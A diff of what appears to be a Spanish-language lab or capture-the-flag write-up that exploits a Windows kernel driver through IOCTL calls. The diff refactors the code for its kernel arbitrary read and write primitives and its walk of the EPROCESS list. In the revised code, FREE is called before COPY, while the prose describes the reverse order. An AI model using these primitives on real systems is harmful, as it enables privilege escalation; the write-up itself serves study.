@@ -1022,34 +1022,14 @@ PS C:\driver></span>
 </span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi">  0x8000200b  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos escribir las funciones de la siguiente forma, todas llaman a <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> para comunicarse con el driver, la función <code class="language-plaintext highlighter-rouge">Alloc</code> manda como entrada una estructura <code class="language-plaintext highlighter-rouge">userData</code>, las funciones <code class="language-plaintext highlighter-rouge">Free</code> y <code class="language-plaintext highlighter-rouge">Copy</code> simplemente llaman a sus códigos <code class="language-plaintext highlighter-rouge">ioctl</code></p>
+<p class="plain-text">Podemos escribir las llamadas de la siguiente forma, se llama a <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> para comunicarse con el driver, el código de <code class="language-plaintext highlighter-rouge">ALLOC</code> escribe la estructura <code class="language-plaintext highlighter-rouge">userData</code>, con <code class="language-plaintext highlighter-rouge">COPY</code> hacemos la escritura al destino y con <code class="language-plaintext highlighter-rouge">FREE</code> liberamos el bloque de memoria</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="na">VOID </span><span class="na">Alloc</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">, ReaperData </span><span class="o">*</span><span class="ra">userData</span><span class="p">) {
-    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">ULONG</span><span class="p"> bytes;
-
-    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
-    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);  
-}
-
-</span><span class="na">VOID Free</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
-    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">ULONG</span><span class="p"> bytes;
-
-    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
-    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, output,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">bytes,</span><span class="mi"> NULL</span><span class="p">);
-}
-
-</span><span class="na">VOID Copy</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
-    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">ULONG</span><span class="p"> bytes;
-
-    ZeroMemory(output,</span><span class="o"> sizeof</span><span class="p">(output));
-    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);
-}</span>
+<code><span class="p">    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
+    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> nos permite escribir un <code class="language-plaintext highlighter-rouge">qword</code>, el primer valor es <code class="language-plaintext highlighter-rouge">Magic</code> que necesitamos para cumplir la condición, a <code class="language-plaintext highlighter-rouge">ThreadId</code> le pasamos el id actual, el <code class="language-plaintext highlighter-rouge">Priority</code> podemos establecerlo a <code class="language-plaintext highlighter-rouge">0</code> y los ultimos valores son la dirección de fuente y de destino, entonces llamamos a la función <code class="language-plaintext highlighter-rouge">Alloc</code> para establecer la estructura, luego a <code class="language-plaintext highlighter-rouge">Copy</code> que escribe el <code class="language-plaintext highlighter-rouge">qword</code> y libera el bloque llamando a la función <code class="language-plaintext highlighter-rouge">Free</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> nos permite escribir un <code class="language-plaintext highlighter-rouge">qword</code>, el primer valor es <code class="language-plaintext highlighter-rouge">Magic</code> que necesitamos para cumplir la condición, a <code class="language-plaintext highlighter-rouge">ThreadId</code> le pasamos el id actual, el <code class="language-plaintext highlighter-rouge">Priority</code> podemos establecerlo a <code class="language-plaintext highlighter-rouge">0</code> y los ultimos valores son la dirección de fuente y de destino, entonces llamamos al <code class="language-plaintext highlighter-rouge">ioctl</code> de <code class="language-plaintext highlighter-rouge">ALLOC</code> para establecer la estructura, luego al de <code class="language-plaintext highlighter-rouge">COPY</code> que escribe el <code class="language-plaintext highlighter-rouge">qword</code> y libera el bloque llamando al de <code class="language-plaintext highlighter-rouge">FREE</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> where</span><span class="p">) {  
     ReaperData userData;
@@ -1060,13 +1040,13 @@ PS C:\driver></span>
     userData.SrcAddress </span><span class="o">= </span><span class="p">what;
     userData.DstAddress </span><span class="o">=</span><span class="p"> where;
 
-    Alloc(hDevice, </span><span class="o">&</span><span class="p">userData);
-    Copy(hDevice);
-    Free(hDevice);
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
+    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryRead</code> es parecida pero solo recibe como argumento donde queremos leer, como destino de <code class="language-plaintext highlighter-rouge">Copy</code> establecemos la referencia a un <code class="language-plaintext highlighter-rouge">qword</code> llamado <code class="language-plaintext highlighter-rouge">output</code> que es el valor que se retorna luego de llamar a las funciones</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryRead</code> es parecida pero solo recibe como argumento donde queremos leer, como destino de <code class="language-plaintext highlighter-rouge">COPY</code> establecemos la referencia a un <code class="language-plaintext highlighter-rouge">qword</code> llamado <code class="language-plaintext highlighter-rouge">output</code> que es el valor que se retorna luego de llamar a las funciones</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {  
     </span><span class="na">QWORD</span><span class="p"> output;
@@ -1078,9 +1058,9 @@ PS C:\driver></span>
     userData.SrcAddress </span><span class="o">= </span><span class="p">where;
     userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
 
-    Alloc(hDevice,</span><span class="o"> &</span><span class="p">userData);
-    Copy(hDevice);
-    Free(hDevice);
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
+    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 
     </span><span class="o">return</span><span class="p"> output;
 }</span>
@@ -1279,30 +1259,6 @@ PROCESS ffffba09b847a040
     </span><span class="na">QWORD</span><span class="p"> DstAddress;
 } </span><span class="na">ReaperData</span><span class="p">;
 
-</span><span class="na">VOID </span><span class="na">Alloc</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">, ReaperData </span><span class="o">*</span><span class="ra">userData</span><span class="p">) {
-    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">ULONG</span><span class="p"> bytes;
-
-    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
-    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);  
-}
-
-</span><span class="na">VOID Free</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
-    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">ULONG</span><span class="p"> bytes;
-
-    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
-    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, output,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">bytes,</span><span class="mi"> NULL</span><span class="p">);
-}
-
-</span><span class="na">VOID Copy</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
-    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">ULONG</span><span class="p"> bytes;
-
-    ZeroMemory(output,</span><span class="o"> sizeof</span><span class="p">(output));
-    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);
-}
-
 </span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> where</span><span class="p">) {
     ReaperData userData;
 
@@ -1312,9 +1268,9 @@ PROCESS ffffba09b847a040
     userData.SrcAddress </span><span class="o">= </span><span class="p">what;
     userData.DstAddress </span><span class="o">=</span><span class="p"> where;
 
-    Alloc(hDevice, </span><span class="o">&</span><span class="p">userData);
-    Copy(hDevice);
-    Free(hDevice);
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
+    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 }
 
 </span><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
@@ -1327,19 +1283,11 @@ PROCESS ffffba09b847a040
     userData.SrcAddress </span><span class="o">= </span><span class="p">where;
     userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
 
-    Alloc(hDevice,</span><span class="o"> &</span><span class="p">userData);
-    Copy(hDevice);
-    Free(hDevice);
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
+    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 
     </span><span class="o">return</span><span class="p"> output;
-}
-
-</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
-    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">DWORD</span><span class="p"> cbNeeded;
-
-    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
-    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
 }
 
 </span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
@@ -1361,7 +1309,7 @@ PROCESS ffffba09b847a040
 
     </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
         </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
-        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);
+        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);  
 
         currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;
 
@@ -1371,6 +1319,14 @@ PROCESS ffffba09b847a040
     }
 
     </span><span class="o">return</span><span class="p"> currentEProcess;
+}
+
+</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
+    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">DWORD</span><span class="p"> cbNeeded;
+
+    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
+    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
 }
 
 </span><span class="no">int</span><span class="na"> main</span><span class="p">() {
